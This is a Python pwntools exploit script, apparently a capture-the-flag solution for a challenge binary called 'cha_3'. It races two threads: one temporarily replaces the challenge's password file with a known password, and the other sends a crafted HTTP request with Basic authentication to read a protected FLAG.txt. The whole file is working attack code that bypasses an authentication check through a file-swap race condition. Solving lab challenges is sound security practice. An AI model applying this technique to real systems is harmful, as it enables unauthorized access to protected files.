from pwn import *
import threading
import time
import os
import shutil

binary = './cha_3'
folder = './cha_3_folder'
real_pw_file = f'{folder}/password.txt'
fake_pw = '123456'
fake_pw_file = f'{folder}/fake_pw.txt'

# Prepare the fake password file
with open(fake_pw_file, 'w') as f:
    f.write(fake_pw)

# Function to temporarily swap in the fake password file
def overwrite_password_temporarily(duration=0.1):
    for _ in range(10):  # Try multiple times
        try:
            # Backup real password
            shutil.move(real_pw_file, f'{real_pw_file}.bak')
            shutil.copy(fake_pw_file, real_pw_file)
            time.sleep(duration)
        finally:
            # Restore real password
            shutil.move(f'{real_pw_file}.bak', real_pw_file)

# Function to send the HTTP request with fake password
def send_fake_request():
    # Construct Authorization header
    auth = b64e(b'admin:' + fake_pw.encode())
    headers = (
        f"GET /secret/FLAG.txt HTTP/1.1\r\n"
        f"Authorization: Basic {auth}\r\n"
        f"Cookie: response=123456\r\n"
        f"\r\n"
    ).encode()

    # Launch process
    io = process([binary, folder], shell=False)
    io.send(headers)
    try:
        result = io.recv(timeout=2)
        print("=== Response ===")
        print(result.decode(errors='ignore'))
    except EOFError:
        print("No response or EOF")
    finally:
        io.close()

# Thread that swaps password.txt
overwrite_thread = threading.Thread(target=overwrite_password_temporarily)

# Thread that sends request
request_thread = threading.Thread(target=send_fake_request)

# Start both
overwrite_thread.start()
request_thread.start()

# Wait for both to finish
overwrite_thread.join()
request_thread.join()
